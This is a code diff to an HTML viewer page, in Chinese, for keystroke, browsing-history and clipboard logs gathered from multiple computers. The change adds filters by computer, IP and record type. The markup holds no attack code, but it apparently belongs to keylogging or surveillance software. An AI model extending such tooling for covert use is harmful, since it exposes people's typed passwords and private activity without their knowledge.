@@ -11,31 +11,44 @@
         <h1>記錄查看器</h1>
         <div class="controls">
             <div class="control-group">
-                <select id="logType">
-                    <option value="keyboard">鍵盤記錄</option>
-                    <option value="browser">瀏覽器歷史</option>
-                </select>
-                <select id="computerFilter">
+                <select id="computerFilter" title="選擇電腦">
                     <option value="">所有電腦</option>
                 </select>
+                <select id="ipFilter" title="選擇IP">
+                    <option value="">所有IP</option>
+                </select>
+                <select id="typeFilter" title="選擇記錄類型">
+                    <option value="">所有類型</option>
+                    <option value="keyboard">鍵盤記錄</option>
+                    <option value="browser">網站記錄</option>
+                    <option value="clipboard">剪貼簿記錄</option>
+                </select>
             </div>
             <div class="control-group">
-                <input type="datetime-local" id="startTime" placeholder="開始時間">
-                <input type="datetime-local" id="endTime" placeholder="結束時間">
+                <input type="datetime-local" id="startTime" title="開始時間">
+                <input type="datetime-local" id="endTime" title="結束時間">
             </div>
             <div class="control-group">
-                <input type="text" id="searchInput" placeholder="搜索...">
-                <button id="exportBtn">導出記錄</button>
+                <input type="text" id="searchInput" placeholder="搜索關鍵字...">
+                <button id="exportBtn" title="導出當前篩選的記錄">導出記錄</button>
             </div>
         </div>
         <div id="status" class="status" style="display: none;"></div>
         <div class="log-container" id="logs">
             <div class="log-entry">
-                <div class="timestamp">載入中...</div>
-                <div class="text-content">正在載入記錄...</div>
+                <div class="text-content">載入中...</div>
             </div>
         </div>
     </div>
-    <script src="./js/app.js"></script>
+    <!-- 確保在 DOM 完全加載後再執行 JavaScript -->
+    <script>
+        // 等待 DOM 完全加載
+        document.addEventListener('DOMContentLoaded', function() {
+            // 加載主要的 JavaScript 文件
+            var script = document.createElement('script');
+            script.src = './js/app.js';
+            document.body.appendChild(script);
+        });
+    </script>
 </body>
 </html> 
